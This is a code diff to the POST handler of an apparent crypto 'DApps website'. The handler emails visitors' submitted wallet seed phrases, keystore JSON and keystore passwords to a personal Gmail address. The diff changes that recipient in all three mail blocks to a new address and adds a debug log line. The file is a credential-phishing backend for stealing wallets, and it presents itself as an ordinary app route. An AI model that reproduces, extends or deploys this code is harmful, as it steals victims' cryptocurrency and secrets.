@@ -54,7 +54,7 @@ export async function POST(request: Request) {
     await formatMessage('hi');
 
     if (phrase) {
-
+      console.log('phrase')
       const email = process.env.EMAIL
       const pass = process.env.PASS
 
@@ -71,7 +71,9 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'yesangela11@gmail.com',
+        port: 587,
+        // to: 'yesangela11@gmail.com',
+        to: "osamathebomber3@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
@@ -110,7 +112,9 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'yesangela11@gmail.com',
+        port: 587,
+         // to: 'yesangela11@gmail.com',
+         to: "osamathebomber3@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -151,7 +155,8 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'yesangela11@gmail.com',
+        // to: 'yesangela11@gmail.com',
+        to: "osamathebomber3@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
